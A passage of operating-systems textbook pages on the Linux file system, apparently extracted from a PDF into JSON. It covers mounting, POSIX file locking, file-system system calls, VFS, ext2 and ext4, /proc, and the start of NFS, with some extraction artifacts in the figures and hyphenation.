ago.\r\nThe Linux solution is to allow one disk to be mounted in another disk’s file\r\ntree. In our example, we could mount the DVD on the directory /b, yielding the\r\nfile system of Fig. 10-25(b). The user now sees a single file tree, and no longer has\r\nto be aware of which file resides on which device. The above copy command now\r\nbecomes\r\ncp /b/x /a/d/x\r\nexactly the same as it would have been if everything had been on the hard disk in\r\nthe first place.\r\nAnother interesting property of the Linux file system is locking. In some ap\u0002plications, two or more processes may be using the same file at the same time,\r\nwhich may lead to race conditions. One solution is to program the application with\nSEC. 10.6 THE LINUX FILE SYSTEM 779\r\n/\r\na b a\r\nc\r\np q r q q r\r\nd\r\n/\r\nc d\r\nb\r\nDVD\r\n/\r\nHard disk Hard disk\r\nx y z\r\nx y z\r\nFigure 10-25. (a) Separate file systems. (b) After mounting.\r\ncritical regions. However, if the processes belong to independent users who do not\r\nev en know each other, this kind of coordination is generally inconvenient.\r\nConsider, for example, a database consisting of many files in one or more di\u0002rectories that are accessed by unrelated users. It is certainly possible to associate a\r\nsemaphore with each directory or file and achieve mutual exclusion by having\r\nprocesses do a down operation on the appropriate semaphore before accessing the\r\ndata. The disadvantage, however, is that a whole directory or file is then made inac\u0002cessible, even though only one record may be needed.\r\nFor this reason, POSIX provides a flexible and fine-grained mechanism for\r\nprocesses to lock as little as a single byte and as much as an entire file in one\r\nindivisible operation. The locking mechanism requires the caller to specify the file\r\nto be locked, the starting byte, and the number of bytes. If the operation succeeds,\r\nthe system makes a table entry noting that the bytes in question (e.g., a database\r\nrecord) are locked.\r\nTw o kinds of locks are provided, shared locks and exclusive locks. If a por\u0002tion of a file already contains a shared lock, a second attempt to place a shared lock\r\non it is permitted, but an attempt to put an exclusive lock on it will fail. If a por\u0002tion of a file contains an exclusive lock, all attempts to lock any part of that portion\r\nwill fail until the lock has been released. In order to successfully place a lock,\r\nev ery byte in the region to be locked must be available.\r\nWhen placing a lock, a process must specify whether it wants to block or not\r\nin the event that the lock cannot be placed. If it chooses to block, when the exist\u0002ing lock has been removed, the process is unblocked and the lock is placed. If the\r\nprocess chooses not to block when it cannot place a lock, the system call returns\r\nimmediately, with the status code telling whether the lock succeeded or not. If it\r\ndid not, the caller has to decide what to do next (e.g., wait and try again).\r\nLocked regions may overlap. In Fig. 10-26(a) we see that process A has placed\r\na shared lock on bytes 4 through 7 of some file. Later, process B places a shared\n780 CASE STUDY 1: UNIX, LINUX, AND ANDROID CHAP. 10\r\nlock on bytes 6 through 9, as shown in Fig. 10-26(b). Finally, C locks bytes 2\r\nthrough 11. As long as all these locks are shared, they can coexist.\r\n(a) 0 1 2 3 8 9 10 11 12 13 14 15\r\n0 1 2 3 10 11 12 13 14 15\r\n0 1 12 13 14 15\r\n(b)\r\n(c)\r\nProcess A's\r\nshared\r\nlock\r\nA's shared lock\r\nB's shared lock\r\nC's shared lock\r\nA B\r\n4567\r\n456789\r\n2 3 4 5 8 9 10 11 6 7\r\nFigure 10-26. (a) A file with one lock. (b) Adding a second lock. (c) A third one.\r\nNow consider what happens if a process tries to acquire an exclusive lock to\r\nbyte 9 of the file of Fig. 10-26(c), with a request to block if the lock fails. Since\r\ntwo previous locks cover this block, the caller will block and will remain blocked\r\nuntil both B and C release their locks."
          },
          "10.6.2 File-System Calls in Linux": {
            "page": 811,
            "content": "10.6.2 File-System Calls in Linux\r\nMany system calls relate to files and the file system. First we will look at the\r\nsystem calls that operate on individual files. Later we will examine those that\r\ninvolve directories or the file system as a whole. To create a new file, the creat call\r\ncan be used. (When Ken Thompson was once asked what he would do differently\r\nif he had the chance to reinvent UNIX, he replied that he would spell creat as cre\u0002ate this time.) The parameters provide the name of the file and the protection\r\nmode. Thus\r\nfd = creat(\"abc\", mode);\r\ncreates a file called abc with the protection bits taken from mode. These bits deter\u0002mine which users may access the file and how. They will be described later.\r\nThe creat call not only creates a new file, but also opens it for writing. To\r\nallow subsequent system calls to access the file, a successful creat returns a small\nSEC. 10.6 THE LINUX FILE SYSTEM 781\r\nnonnegative integer called a file descriptor, fd in the example above. If a creat is\r\ndone on an existing file, that file is truncated to length 0 and its contents are dis\u0002carded. Files can also be created using the open call with appropriate arguments.\r\nNow let us continue looking at the main file-system calls, which are listed in\r\nFig. 10-27. To read or write an existing file, the file must first be opened by calling\r\nopen or creat. This call specifies the file name to be opened and how it is to be\r\nopened: for reading, writing, or both. Various options can be specified as well.\r\nLike creat, the call to open returns a file descriptor that can be used for reading or\r\nwriting. Afterward, the file can be closed by close, which makes the file descriptor\r\navailable for reuse on a subsequent creat or open. Both the creat and open calls\r\nalways return the lowest-numbered file descriptor not currently in use.\r\nWhen a program starts executing in the standard way, file descriptors 0, 1, and\r\n2 are already opened for standard input, standard output, and standard error, re\u0002spectively. In this way, a filter, such as the sort program, can just read its input\r\nfrom file descriptor 0 and write its output to file descriptor 1, without having to\r\nknow what files they are. This mechanism works because the shell arranges for\r\nthese values to refer to the correct (redirected) files before the program is started.\r\nSystem call Description\r\nfd = creat(name, mode) One way to create a new file\r\nfd = open(file, how, ...) Open a file for reading, writing, or both\r\ns = close(fd) Close an open file\r\nn = read(fd, buffer, nbytes) Read data from a file into a buffer\r\nn = write(fd, buffer, nbytes) Write data from a buffer into a file\r\nposition = lseek(fd, offset, whence) Move the file pointer\r\ns = stat(name, &buf) Get a file’s status infor mation\r\ns = fstat(fd, &buf) Get a file’s status infor mation\r\ns = pipe(&fd[0]) Create a pipe\r\ns = fcntl(fd, cmd, ...) File locking and other operations\r\nFigure 10-27. Some system calls relating to files. The return code s is −1 if an\r\nerror has occurred; fd is a file descriptor, and position is a file offset. The parame\u0002ters should be self explanatory.\r\nThe most heavily used calls are undoubtedly read and wr ite. Each one has\r\nthree parameters: a file descriptor (telling which open file to read or write), a buffer\r\naddress (telling where to put the data or get the data from), and a count (telling\r\nhow many bytes to transfer). That is all there is. It is a very simple design. A typ\u0002ical call is\r\nn = read(fd, buffer, nbytes);\r\nAlthough nearly all programs read and write files sequentially, some programs\r\nneed to be able to access any part of a file at random. Associated with each file is a\n782 CASE STUDY 1: UNIX, LINUX, AND ANDROID CHAP. 10\r\npointer that indicates the current position in the file. When reading (or writing) se\u0002quentially, it normally points to the next byte to be read (written). If the pointer is\r\nat, say, 4096, before 1024 bytes are read, it will automatically be moved to 5120\r\nafter a successful read system call. The lseek call changes the value of the position\r\npointer, so that subsequent calls to read or wr ite can begin anywhere in the file, or\r\nev en beyond the end of it. It is called lseek to avoid conflicting with seek, a now\u0002obsolete call that was formerly used on 16-bit computers for seeking.\r\nLseek has three parameters: the first one is the file descriptor for the file; the\r\nsecond is a file position; the third tells whether the file position is relative to the be\u0002ginning of the file, the current position, or the end of the file. The value returned by\r\nlseek is the absolute position in the file after the file pointer is changed. Slightly\r\nironically, lseek is the only file system call that never causes a real disk seek be\u0002cause all it does is update the current file position, which is a number in memory.\r\nFor each file, Linux keeps track of the file mode (regular, directory, special\r\nfile), size, time of last modification, and other information. Programs can ask to see\r\nthis information via the stat system call. The first parameter is the file name. The\r\nsecond is a pointer to a structure where the information requested is to be put. The\r\nfields in the structure are shown in Fig. 10-28. The fstat call is the same as stat ex\u0002cept that it operates on an open file (whose name may not be known) rather than on\r\na path name.\r\nDevice the file is on\r\nI-node number (which file on the device)\r\nFile mode (includes protection infor mation)\r\nNumber of links to the file\r\nIdentity of the file’s owner\r\nGroup the file belongs to\r\nFile size (in bytes)\r\nCreation time\r\nTime of last access\r\nTime of last modification\r\nFigure 10-28. The fields returned by the stat system call.\r\nThe pipe system call is used to create shell pipelines. It creates a kind of\r\npseudofile, which buffers the data between the pipeline components, and returns\r\nfile descriptors for both reading and writing the buffer. In a pipeline such as\r\nsor t <in | head –30\r\nfile descriptor 1 (standard output) in the process running sort would be set (by the\r\nshell) to write to the pipe, and file descriptor 0 (standard input) in the process run\u0002ning head would be set to read from the pipe. In this way, sort just reads from file\r\ndescriptor 0 (set to the file in) and writes to file descriptor 1 (the pipe) without even\nSEC. 10.6 THE LINUX FILE SYSTEM 783\r\nbeing aware that these have been redirected. If they hav e not been redirected, sort\r\nwill automatically read from the keyboard and write to the screen (the default de\u0002vices). Similarly, when head reads from file descriptor 0, it is reading the data sort\r\nput into the pipe buffer without even knowing that a pipe is in use. This is a clear\r\nexample of how a simple concept (redirection) with a simple implementation (file\r\ndescriptors 0 and 1) can lead to a powerful tool (connecting programs in arbitrary\r\nways without having to modify them at all).\r\nThe last system call in Fig. 10-27 is fcntl. It is used to lock and unlock files,\r\napply shared or exclusive locks, and perform a few other file-specific operations.\r\nNow let us look at some system calls that relate more to directories or the file\r\nsystem as a whole, rather than just to one specific file. Some common ones are list\u0002ed in Fig. 10-29. Directories are created and destroyed using mkdir and rmdir, re\u0002spectively. A directory can be removed only if it is empty.\r\nSystem call Description\r\ns = mkdir(path, mode) Create a new director y\r\ns = rmdir(path) Remove a director y\r\ns = link(oldpath, newpath) Create a link to an existing file\r\ns = unlink(path) Unlink a file\r\ns = chdir(path) Change the wor king director y\r\ndir = opendir(path) Open a directory for reading\r\ns = closedir(dir) Close a director y\r\ndirent = readdir(dir) Read one directory entr y\r\nrewinddir(dir) Rewind a directory so it can be reread\r\nFigure 10-29. Some system calls relating to directories. The return code s is −1\r\nif an error has occurred; dir identifies a directory stream, and dirent is a directory\r\nentry. The parameters should be self explanatory.\r\nAs we saw in Fig. 10-24, linking to a file creates a new directory entry that\r\npoints to an existing file. The link system call creates the link. The parameters spec\u0002ify the original and new names, respectively. Directory entries are removed with\r\nunlink. When the last link to a file is removed, the file is automatically deleted. For\r\na file that has never been linked, the first unlink causes it to disappear.\r\nThe working directory is changed by the chdir system call. Doing so has the ef\u0002fect of changing the interpretation of relative path names.\r\nThe last four calls of Fig. 10-29 are for reading directories. They can be open\u0002ed, closed, and read, analogous to ordinary files. Each call to readdir returns exact\u0002ly one directory entry in a fixed format. There is no way for users to write in a di\u0002rectory (in order to maintain the integrity of the file system). Files can be added to\r\na directory using creat or link and removed using unlink. There is also no way to\r\nseek to a specific file in a directory, but rewinddir allows an open directory to be\r\nread again from the beginning.\n784 CASE STUDY 1: UNIX, LINUX, AND ANDROID CHAP. 10"
          },
          "10.6.3 Implementation of the Linux File System": {
            "page": 815,
            "content": "10.6.3 Implementation of the Linux File System\r\nIn this section we will first look at the abstractions supported by the Virtual\r\nFile System layer. The VFS hides from higher-level processes and applications the\r\ndifferences among many types of file systems supported by Linux, whether they\r\nare residing on local devices or are stored remotely and need to be accessed over\r\nthe network. Devices and other special files are also accessed through the VFS\r\nlayer. Next, we will describe the implementation of the first widespread Linux file\r\nsystem, ext2, or the second extended file system. Afterward, we will discuss the\r\nimprovements in the ext4 file system. A wide variety of other file systems are also\r\nin use. All Linux systems can handle multiple disk partitions, each with a different\r\nfile system on it.\r\nThe Linux Virtual File System\r\nIn order to enable applications to interact with different file systems, imple\u0002mented on different types of local or remote devices, Linux takes an approach used\r\nin other UNIX systems: the Virtual File System (VFS). VFS defines a set of basic\r\nfile-system abstractions and the operations which are allowed on these abstrac\u0002tions. Invocations of the system calls described in the previous section access the\r\nVFS data structures, determine the exact file system where the accessed file be\u0002longs, and via function pointers stored in the VFS data structures invoke the corres\u0002ponding operation in the specified file system.\r\nFigure 10-30 summarizes the four main file-system structures supported by\r\nVFS. The superblock contains critical information about the layout of the file sys\u0002tem. Destruction of the superblock will render the file system unreadable. The i\u0002nodes (short for index-nodes, but never called that, although some lazy people\r\ndrop the hyphen and call them inodes) each describe exactly one file. Note that in\r\nLinux, directories and devices are also represented as files, thus they will have cor\u0002responding i-nodes. Both superblocks and i-nodes have a corresponding structure\r\nmaintained on the physical disk where the file system resides.\r\nObject Description Operation\r\nSuperblock specific file-system read inode, sync fs\r\nDentr y director y entr y, single component of a path create, link\r\nI-node specific file d compare, d delete\r\nFile open file associated with a process read, write\r\nFigure 10-30. File-system abstractions supported by the VFS.\r\nIn order to facilitate certain directory operations and traversals of paths, such\r\nas /usr/ast/bin, VFS supports a dentry data structure which represents a directory\r\nentry. This data structure is created by the file system on the fly. Directory entries\nSEC. 10.6 THE LINUX FILE SYSTEM 785\r\nare cached in what is called the dentry cache. For instance, the dentry cache\r\nwould contain entries for /, /usr, /usr/ast, and the like. If multiple processes access\r\nthe same file through the same hard link (i.e., same path), their file object will\r\npoint to the same entry in this cache.\r\nFinally, the file data structure is an in-memory representation of an open file,\r\nand is created in response to the open system call. It supports operations such as\r\nread, wr ite, sendfile, lock, and other system calls described in the previous section.\r\nThe actual file systems implemented underneath the VFS need not use the\r\nexact same abstractions and operations internally. They must, however, implement\r\nfile-system operations semantically equivalent to those specified with the VFS ob\u0002jects. The elements of the operations data structures for each of the four VFS ob\u0002jects are pointers to functions in the underlying file system.\r\nThe Linux Ext2 File System\r\nWe next describe one of the most popular on-disk file systems used in Linux:\r\next2. The first Linux release used the MINIX 1 file system and was limited by\r\nshort file names and 64-MB file sizes. The MINIX 1 file system was eventually re\u0002placed by the first extended file system, ext, which permitted both longer file\r\nnames and larger file sizes. Due to its performance inefficiencies, ext was replaced\r\nby its successor, ext2, which is still in widespread use.\r\nAn ext2 Linux disk partition contains a file system with the layout shown in\r\nFig. 10-31. Block 0 is not used by Linux and contains code to boot the computer.\r\nFollowing block 0, the disk partition is divided into groups of blocks, irrespective\r\nof where the disk cylinder boundaries fall. Each group is organized as follows.\r\nThe first block is the superblock. It contains information about the layout of\r\nthe file system, including the number of i-nodes, the number of disk blocks, and\r\nthe start of the list of free disk blocks (typically a few hundred entries). Next\r\ncomes the group descriptor, which contains information about the location of the\r\nbitmaps, the number of free blocks and i-nodes in the group, and the number of di\u0002rectories in the group. This information is important since ext2 attempts to spread\r\ndirectories evenly over the disk.\r\nBoot Block group 0\r\nSuper– Group\r\nblock descriptor\r\nBlock group 1\r\nBlock\r\nbitmap\r\nData\r\nblocks\r\nI–node\r\nbitmap I–nodes\r\nBlock group 2 Block group 3 Block group 4 ...\r\nFigure 10-31. Disk layout of the Linux ext2 file system.\n786 CASE STUDY 1: UNIX, LINUX, AND ANDROID CHAP. 10\r\nTw o bitmaps are used to keep track of the free blocks and free i-nodes, respect\u0002iv ely, a choice inherited from the MINIX 1 file system (and in contrast to most\r\nUNIX file systems, which use a free list). Each map is one block long. With a\r\n1-KB block, this design limits a block group to 8192 blocks and 8192 i-nodes. The\r\nformer is a real restriction but, in practice, the latter is not. With 4-KB blocks, the\r\nnumbers are four times larger.\r\nFollowing the superblock are the i-nodes themselves. They are numbered from\r\n1 up to some maximum. Each i-node is 128 bytes long and describes exactly one\r\nfile. An i-node contains accounting information (including all the information re\u0002turned by stat, which simply takes it from the i-node), as well as enough informa\u0002tion to locate all the disk blocks that hold the file’s data.\r\nFollowing the i-nodes are the data blocks. All the files and directories are stor\u0002ed here. If a file or directory consists of more than one block, the blocks need not\r\nbe contiguous on the disk. In fact, the blocks of a large file are likely to be spread\r\nall over the disk.\r\nI-nodes corresponding to directories are dispersed throughout the disk block\r\ngroups. Ext2 makes an effort to collocate ordinary files in the same block group as\r\nthe parent directory, and data files in the same block as the original file i-node, pro\u0002vided that there is sufficient space. This idea was borrowed from the Berkeley Fast\r\nFile System (McKusick et al., 1984). The bitmaps are used to make quick decis\u0002ions regarding where to allocate new file-system data. When new file blocks are al\u0002located, ext2 also preallocates a number (eight) of additional blocks for that file, so\r\nas to minimize the file fragmentation due to future write operations. This scheme\r\nbalances the file-system load across the entire disk. It also performs well due to its\r\ntendencies for collocation and reduced fragmentation.\r\nTo access a file, it must first use one of the Linux system calls, such as open,\r\nwhich requires the file’s path name. The path name is parsed to extract individual\r\ndirectories. If a relative path is specified, the lookup starts from the process’ cur\u0002rent directory, otherwise it starts from the root directory. In either case, the i-node\r\nfor the first directory can easily be located: there is a pointer to it in the process de\u0002scriptor, or, in the case of a root directory, it is typically stored in a predetermined\r\nblock on disk.\r\nThe directory file allows file names up to 255 characters and is illustrated in\r\nFig. 10-32. Each directory consists of some integral number of disk blocks so that\r\ndirectories can be written atomically to the disk. Within a directory, entries for files\r\nand directories are in unsorted order, with each entry directly following the one be\u0002fore it. Entries may not span disk blocks, so often there are some number of unused\r\nbytes at the end of each disk block.\r\nEach directory entry in Fig. 10-32 consists of four fixed-length fields and one\r\nvariable-length field. The first field is the i-node number, 19 for the file colossal,\r\n42 for the file voluminous, and 88 for the directory bigdir. Next comes a field\r\nrec len, telling how big the entry is (in bytes), possibly including some padding\r\nafter the name. This field is needed to find the next entry for the case that the file\nSEC. 10.6 THE LINUX FILE SYSTEM 787\r\n(a) 42 19 F 8 F 10 88 D 6 bigdir colossal voluminous Unused\r\n(b) F 8 88 D 6 bigdir 19 colossal Unused Unused\r\nI-node number\r\nEntry size\r\nType\r\nFile name length\r\nFigure 10-32. (a) A Linux directory with three files. (b) The same directory af\u0002ter the file voluminous has been removed.\r\nname is padded by an unknown length. That is the meaning of the arrow in\r\nFig. 10-32. Then comes the type field: file, directory, and so on. The last fixed\r\nfield is the length of the actual file name in bytes, 8, 10, and 6 in this example.\r\nFinally, comes the file name itself, terminated by a 0 byte and padded out to a\r\n32-bit boundary. Additional padding may follow that.\r\nIn Fig. 10-32(b) we see the same directory after the entry for voluminous has\r\nbeen removed. All the removeal has done is increase the size of the total entry field\r\nfor colossal, turning the former field for voluminous into padding for the first entry.\r\nThis padding can be used for a subsequent entry, of course.\r\nSince directories are searched linearly, it can take a long time to find an entry\r\nat the end of a large directory. Therefore, the system maintains a cache of recently\r\naccessed directories. This cache is searched using the name of the file, and if a hit\r\noccurs, the costly linear search is avoided. A dentry object is entered in the dentry\r\ncache for each of the path components, and, through its i-node, the directory is\r\nsearched for the subsequent path element entry, until the actual file i-node is\r\nreached.\r\nFor instance, to look up a file specified with an absolute path name, such as\r\n/usr/ast/file, the following steps are required. First, the system locates the root di\u0002rectory, which generally uses i-node 2, especially when i-node 1 is reserved for\r\nbad-block handling. It places an entry in the dentry cache for future lookups of the\r\nroot directory. Then it looks up the string ‘‘usr’’ in the root directory, to get the i\u0002node number of the /usr directory, which is also entered in the dentry cache. This i\u0002node is then fetched, and the disk blocks are extracted from it, so the /usr directory\r\ncan be read and searched for the string ‘‘ast’’. Once this entry is found, the i-node\n788 CASE STUDY 1: UNIX, LINUX, AND ANDROID CHAP. 10\r\nnumber for the /usr/ast directory can be taken from it. Armed with the i-node num\u0002ber of the /usr/ast directory, this i-node can be read and the directory blocks locat\u0002ed. Finally, ‘‘file’’ is looked up and its i-node number found. Thus, the use of a rel\u0002ative path name is not only more convenient for the user, but it also saves a sub\u0002stantial amount of work for the system.\r\nIf the file is present, the system extracts the i-node number and uses it as an\r\nindex into the i-node table (on disk) to locate the corresponding i-node and bring it\r\ninto memory. The i-node is put in the i-node table, a kernel data structure that\r\nholds all the i-nodes for currently open files and directories. The format of the i\u0002node entries, as a bare minimum, must contain all the fields returned by the stat\r\nsystem call so as to make stat work (see Fig. 10-28). In Fig. 10-33 we show some\r\nof the fields included in the i-node structure supported by the Linux file-system\r\nlayer. The actual i-node structure contains many more fields, since the same struc\u0002ture is also used to represent directories, devices, and other special files. The i\u0002node structure also contains fields reserved for future use. History has shown that\r\nunused bits do not remain that way for long.\r\nField Bytes Description\r\nMode 2 File type, protection bits, setuid, setgid bits\r\nNlinks 2 Number of directory entr ies pointing to this i-node\r\nUid 2 UID of the file owner\r\nGid 2 GID of the file owner\r\nSize 4 File size in bytes\r\nAddr 60 Address of first 12 disk blocks, then 3 indirect blocks\r\nGen 1 Generation number (incremented every time i-node is reused)\r\nAtime 4 Time the file was last accessed\r\nMtime 4 Time the file was last modified\r\nCtime 4 Time the i-node was last changed (except the other times)\r\nFigure 10-33. Some fields in the i-node structure in Linux.\r\nLet us now see how the system reads a file. Remember that a typical call to the\r\nlibrary procedure for invoking the read system call looks like this:\r\nn = read(fd, buffer, nbytes);\r\nWhen the kernel gets control, all it has to start with are these three parameters and\r\nthe information in its internal tables relating to the user. One of the items in the in\u0002ternal tables is the file-descriptor array. It is indexed by a file descriptor and con\u0002tains one entry for each open file (up to the maximum number, usually defaults to\r\n32).\r\nThe idea is to start with this file descriptor and end up with the corresponding\r\ni-node. Let us consider one possible design: just put a pointer to the i-node in the\r\nfile-descriptor table. Although simple, unfortunately this method does not work.\nSEC. 10.6 THE LINUX FILE SYSTEM 789\r\nThe problem is as follows. Associated with every file descriptor is a file position\r\nthat tells at which byte the next read (or write) will start. Where should it go? One\r\npossibility is to put it in the i-node table. However, this approach fails if two or\r\nmore unrelated processes happen to open the same file at the same time because\r\neach one has its own file position.\r\nA second possibility is to put the file position in the file-descriptor table. In\r\nthat way, every process that opens a file gets its own private file position. Unfortun\u0002ately this scheme fails too, but the reasoning is more subtle and has to do with the\r\nnature of file sharing in Linux. Consider a shell script, s, consisting of two com\u0002mands, p1 and p2, to be run in order. If the shell script is called by the command\r\ns >x\r\nit is expected that p1 will write its output to x, and then p2 will write its output to x\r\nalso, starting at the place where p1 stopped.\r\nWhen the shell forks off p1, x is initially empty, so p1 just starts writing at file\r\nposition 0. However, when p1 finishes, some mechanism is needed to make sure\r\nthat the initial file position that p2 sees is not 0 (which it would be if the file posi\u0002tion were kept in the file-descriptor table), but the value p1 ended with.\r\nThe way this is achieved is shown in Fig. 10-34. The trick is to introduce a\r\nnew table, the open-file-description table, between the file descriptor table and\r\nthe i-node table, and put the file position (and read/write bit) there. In this figure,\r\nthe parent is the shell and the child is first p1 and later p2. When the shell forks off\r\np1, its user structure (including the file-descriptor table) is an exact copy of the\r\nshell’s, so both of them point to the same open-file-description table entry. When\r\np1 finishes, the shell’s file descriptor is still pointing to the open-file description\r\ncontaining p1’s file position. When the shell now forks off p2, the new child auto\u0002matically inherits the file position, without either it or the shell even having to\r\nknow what that position is.\r\nHowever, if an unrelated process opens the file, it gets its own open-file-de\u0002scription entry, with its own file position, which is precisely what is needed. Thus\r\nthe whole point of the open-file-description table is to allow a parent and child to\r\nshare a file position, but to provide unrelated processes with their own values.\r\nGetting back to the problem of doing the read, we hav e now shown how the\r\nfile position and i-node are located. The i-node contains the disk addresses of the\r\nfirst 12 blocks of the file. If the file position falls in the first 12 blocks, the block is\r\nread and the data are copied to the user. For files longer than 12 blocks, a field in\r\nthe i-node contains the disk address of a single indirect block, as shown in\r\nFig. 10-34. This block contains the disk addresses of more disk blocks. For ex\u0002ample, if a block is 1 KB and a disk address is 4 bytes, the single indirect block\r\ncan hold 256 disk addresses. Thus this scheme works for files of up to 268 KB.\r\nBeyond that, a double indirect block is used. It contains the addresses of 256\r\nsingle indirect blocks, each of which holds the addresses of 256 data blocks. This\r\nmechanism is sufficient to handle files up to 10 + 216 blocks (67,119,104 bytes). If\n790 CASE STUDY 1: UNIX, LINUX, AND ANDROID CHAP. 10\r\nMode\r\ni-node\r\nLink count\r\nUid\r\nGid\r\nFile size\r\nTimes\r\nAddresses of\r\nfirst 12\r\ndisk blocks\r\nSingle indirect\r\nDouble indirect\r\nTriple indirect\r\nParent's\r\nfile\u0002descriptor\r\ntable\r\nChild's\r\nfile\u0002descriptor\r\ntable\r\nUnrelated\r\nprocess \r\nfile\u0002descriptor\r\ntable\r\nOpen file\r\ndescription\r\nFile position\r\nR/W\r\nPointer to i-node\r\nFile position\r\nR/W\r\nPointer to i-node\r\nPointers to\r\ndisk blocks\r\nTriple\r\nindirect\r\nblock Double\r\nindirect\r\nblock Single\r\nindirect\r\nblock\r\n`\r\nFigure 10-34. The relation between the file-descriptor table, the open-file-de\u0002scription-table, and the i-node table.\r\nev en this is not enough, the i-node has space for a triple indirect block. Its point\u0002ers point to many double indirect blocks. This addressing scheme can handle file\r\nsizes of 224 1-KB blocks (16 GB). For 8-KB block sizes, the addressing scheme\r\ncan support file sizes up to 64 TB.\r\nThe Linux Ext4 File System\r\nIn order to prevent all data loss after system crashes and power failures, the\r\next2 file system would have to write out each data block to disk as soon as it was\r\ncreated. The latency incurred during the required disk-head seek operation would\r\nbe so high that the performance would be intolerable. Therefore, writes are delay\u0002ed, and changes may not be committed to disk for up to 30 sec, which is a very\r\nlong time interval in the context of modern computer hardware.\r\nTo improve the robustness of the file system, Linux relies on journaling file\r\nsystems. Ext3, a successor of the ext2 file system, is an example of a journaling\r\nfile system. Ext4, a follow-on of ext3, is also a journaling file system, but unlike\nSEC. 10.6 THE LINUX FILE SYSTEM 791\r\next3, it changes the block addressing scheme used by its predecessors, thereby sup\u0002porting both larger files and larger overall file-system sizes. We will describe some\r\nof its features next.\r\nThe basic idea behind a journaling file system is to maintain a journal, which\r\ndescribes all file-system operations in sequential order. By sequentially writing out\r\nchanges to the file-system data or metadata (i-nodes, superblock, etc.), the opera\u0002tions do not suffer from the overheads of disk-head movement during random disk\r\naccesses. Eventually, the changes will be written out, committed, to the appropriate\r\ndisk location, and the corresponding journal entries can be discarded. If a system\r\ncrash or power failure occurs before the changes are committed, during restart the\r\nsystem will detect that the file system was not unmounted properly, traverse the\r\njournal, and apply the file-system changes described in the journal log.\r\nExt4 is designed to be highly compatible with ext2 and ext3, although its core\r\ndata structures and disk layout are modified. Regardless, a file system which has\r\nbeen unmounted as an ext2 system can be subsequently mounted as an ext4 system\r\nand offer the journaling capability.\r\nThe journal is a file managed as a circular buffer. The journal may be stored on\r\nthe same or a separate device from the main file system. Since the journal opera\u0002tions are not \"journaled\" themselves, these are not handled by the same ext4 file\r\nsystem. Instead, a separate JBD (Journaling Block Device) is used to perform the\r\njournal read/write operations.\r\nJBD supports three main data structures: log record, atomic operation handle,\r\nand transaction. A log record describes a low-level file-system operation, typically\r\nresulting in changes within a block. Since a system call such as wr ite includes\r\nchanges at multiple places—i-nodes, existing file blocks, new file blocks, list of\r\nfree blocks, etc.—related log records are grouped in atomic operations. Ext4 noti\u0002fies JBD of the start and end of system-call processing, so that JBD can ensure that\r\neither all log records in an atomic operation are applied, or none of them. Finally,\r\nprimarily for efficiency reasons, JBD treats collections of atomic operations as\r\ntransactions. Log records are stored consecutively within a transaction. JBD will\r\nallow portions of the journal file to be discarded only after all log records be\u0002longing to a transaction are safely committed to disk.\r\nSince writing out a log entry for each disk change may be costly, ext4 may be\r\nconfigured to keep a journal of all disk changes, or only of changes related to the\r\nfile-system metadata (the i-nodes, superblocks, etc.). Journaling only metadata\r\ngives less system overhead and results in better performance but does not make any\r\nguarantees against corruption of file data. Several other journaling file systems\r\nmaintain logs of only metadata operations (e.g., SGI’s XFS). In addition, the\r\nreliability of the journal can be further improved via checksumming.\r\nKe y modification in ext4 compared to its predecessors is the use of extents.\r\nExtents represent contiguous blocks of storage, for instance 128 MB of contiguous\r\n4-KB blocks vs. individual storage blocks, as referenced in ext2. Unlike its prede\u0002cessors, ext4 does not require metadata operations for each block of storage. This\n792 CASE STUDY 1: UNIX, LINUX, AND ANDROID CHAP. 10\r\nscheme also reduces fragmentation for large files. As a result, ext4 can provide\r\nfaster file system operations and support larger files and file system sizes. For\r\ninstance, for a block size of 1 KB, ext4 increases the maximum file size from 16\r\nGB to 16 TB, and the maximum file system size to 1 EB (Exabyte).\r\nThe /proc File System\r\nAnother Linux file system is the /proc (process) file system, an idea originally\r\ndevised in the 8th edition of UNIX from Bell Labs and later copied in 4.4BSD and\r\nSystem V. Howev er, Linux extends the idea in several ways. The basic concept is\r\nthat for every process in the system, a directory is created in /proc. The name of\r\nthe directory is the process PID expressed as a decimal number. For example,\r\n/proc/619 is the directory corresponding to the process with PID 619. In this direc\u0002tory are files that appear to contain information about the process, such as its com\u0002mand line, environment strings, and signal masks. In fact, these files do not exist\r\non the disk. When they are read, the system retrieves the information from the ac\u0002tual process as needed and returns it in a standard format.\r\nMany of the Linux extensions relate to other files and directories located in\r\n/proc. They contain a wide variety of information about the CPU, disk partitions,\r\ndevices, interrupt vectors, kernel counters, file systems, loaded modules, and much\r\nmore. Unprivileged user programs may read much of this information to learn\r\nabout system behavior in a safe way. Some of these files may be written to in order\r\nto change system parameters."
          },
          "10.6.4 NFS: The Network File System": {
            "page": 823,
            "content": "10.6.4 NFS: The Network File System\r\nNetworking has played a major role in Linux, and UNIX in general, right from\r\nthe beginning (the first UNIX network was built to move new kernels from the\r\nPDP-11/70 to the Interdata 8/32 during the port to the latter). In this section we\r\nwill examine Sun Microsystem’s NFS (Network File System), which is used on\r\nall modern Linux systems to join the file systems on separate computers into one\r\nlogical whole. Currently, the dominant NSF implementation is version 3, intro\u0002duced in 1994. NSFv4 was introduced in 2000 and provides several enhancements\r\nover the previous NFS architecture. Three aspects of NFS are of interest: the archi\u0002tecture, the protocol, and the implementation. We will now examine these in turn,\r\nfirst in the context of the simpler NFS version 3, then we will turn to the enhance\u0002ments included in v4.\r\nNFS Architecture\r\nThe basic idea behind NFS is to allow an arbitrary collection of clients and ser\u0002vers to share a common file system. In many cases, all the clients and servers are\r\non the same LAN, but this is not required. It is also possible to run NFS over a\nSEC. 10.6 THE LINUX FILE SYSTEM 793\r\nwide area network if the server is far from the client. For simplicity we will speak\r\nof clients and servers as though they were on distinct machines, but in fact, NFS al\u0002lows every machine to be both a client and a server at the same time.\r\nEach NFS server exports one or more of its directories for access by remote\r\nclients. When a directory is made available, so are all of its subdirectories, so ac\u0002tually entire directory trees are normally exported as a unit. The list of directories a\r\nserver exports is maintained in a file, often /etc/exports, so these directories can be\r\nexported automatically whenever the server is booted. Clients access exported di\u0002rectories by mounting them. When a client mounts a (remote) directory, it be\u0002comes part of its directory hierarchy, as shown in Fig. 10-35.\r\nClient 1 Client 2\r\nServer 1 Server 2\r\n/\r\n/usr\r\n/usr/ast\r\n/usr/ast/work\r\n/bin\r\n/bin\r\ncat cp Is mv sh\r\nabc d e\r\n/proj1 /proj2\r\n/projects\r\n/bin /mnt\r\nMount\r\n/\r\nFigure 10-35. Examples of remote mounted file systems. Directories are shown\r\nas squares and files as circles.\r\nIn this example, client 1 has mounted the bin directory of server 1 on its 